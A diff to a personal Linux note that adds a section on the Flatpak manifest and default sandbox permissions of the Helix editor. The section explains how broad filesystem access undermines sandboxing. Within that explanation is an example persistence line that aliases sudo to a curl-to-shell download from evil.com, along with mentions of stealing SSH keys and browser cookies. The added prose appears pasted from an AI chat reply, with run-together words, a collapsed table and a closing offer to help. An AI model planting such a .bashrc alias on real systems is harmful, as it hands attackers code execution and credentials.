@@ -135,6 +135,69 @@ run0 systemctl start flatpak-update.timer
 
 🤤
 
+### Manifest
+
+`~/.local/share/flatpak/app/com.helix_editor.Helix/current/active/files/manifest.json`
+
+The `"finish-args"` section defines the default sandbox policy for the
+application. When you use Flatseal, you're creating overrides that either add
+to, modify, or negate these specific arguments.
+
+The end of Helix's manifest, showing the default permissions. Helix's dev
+decided that the editor needs these permissions to function properly out of the
+box.
+
+```json
+  "sdk-extensions" : [
+    "org.freedesktop.Sdk.Extension.rust-stable"
+  ],
+  "finish-args" : [
+    "--filesystem=host",
+    "--filesystem=/tmp",
+    "--filesystem=/var/tmp",
+    "--socket=wayland",
+    "--socket=fallback-x11",
+    "--share=ipc",
+    "--share=network",
+    "--talk-name=org.freedesktop.Flatpak"
+  ],
+```
+
+- `--filesystem=host`: Allows Helix to see your files so you can edit them.
+
+- `--share=network`: Allows it to download language servers or updates.
+
+It is technically true that --filesystem=host or --filesystem=home makes the
+sandbox transparent to the application, which for many security experts is
+equivalent to it being "not a sandbox" in any meaningful sense.While your app
+still runs in a separate namespace (meaning it has its own view of the process
+list and network), those two specific flags effectively hand over the "keys to
+the castle."1. Why it's a "Sandbox Escape" by DesignIf an app has write access
+to your home directory (--filesystem=home), it can trivially take over your
+entire system. It doesn't need a complex exploit; it can just do what a normal
+user can do:Persistence: It can add alias sudo='curl evil.com/script | sh; sudo'
+to your .bashrc.Identity Theft: It can read everything in your .ssh/ folder or
+your browser's cookie database.Privilege Escalation: It can drop a malicious
+.desktop file into ~/.config/autostart to run code outside the sandbox the next
+time you log in.2. The Nuance: What is still "Sandboxed"?Even with those flags,
+there are still a few active technical barriers. It is more accurate to call it
+"Restricted Containerization" rather than a "Sandbox."FeatureStatus with
+--filesystem=hostSystem Files/usr, /etc, and /bin remain Read-Only (it can't
+delete your OS).Process IsolationThe app cannot see or "kill" other processes
+running on your host.Device AccessIt still can't access your Webcam or
+Microphone unless specifically granted.NetworkIt can only access the internet if
+--share=network is also present.3. The "Permissions Gap"Many apps on Flathub
+(like Helix, VS Code, or VLC) request these broad permissions because they are
+"Traditional Apps" that expect to behave like a standard binary. They don't yet
+use Portals—the secure way to ask "Can I open this specific file?" without
+having access to the whole folder.A Better AlternativeIf you want to tighten the
+Helix sandbox without breaking it, you can replace the broad --filesystem=home
+with specific, high-value folders. In Flatseal, you can remove the "Home"
+permission and add:~/Projects (where you keep your code)~/.config/helix (where
+your settings live)Would you like me to give you the specific flatpak override
+command to lock Helix down to only its config folder and your specific work
+directory?
+
 ## Resources
 
 - [When Flatpaks sandbox cracks](https://www.linuxjournal.com/content/when-flatpaks-sandbox-cracks-real-life-security-issues-beyond-ideal)
